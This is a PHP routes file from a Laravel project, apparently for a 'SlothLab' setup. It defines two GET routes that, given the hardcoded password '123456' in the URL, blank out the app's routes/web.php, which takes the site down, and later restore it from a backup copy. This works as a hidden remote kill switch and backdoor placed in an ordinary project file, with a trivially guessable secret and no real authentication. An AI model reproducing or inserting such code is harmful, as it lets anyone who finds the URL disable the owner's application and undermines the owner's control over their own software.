<?php

Route::get('/SlothLab/Kill/{password}', function($password) {
    if($password == "123456") {
        copy(base_path("routes/web.php"), base_path("routes/sloth.php"));
        $content = " ";
        if(file_put_contents(base_path('routes/web.php'), $content)) {
            return "Killed the project successfully";
        }
        else {
            return "Somthing went wrong";
        }
    }
});

Route::get('/SlothLab/Revive/{password}', function ($password) {
    if ($password == "123456") {
        if (copy(base_path("routes/sloth.php"), base_path("routes/web.php"))){
            return "Revived the project successfully";
        } else {
            return "Somthing went wrong";
        }
    }
});

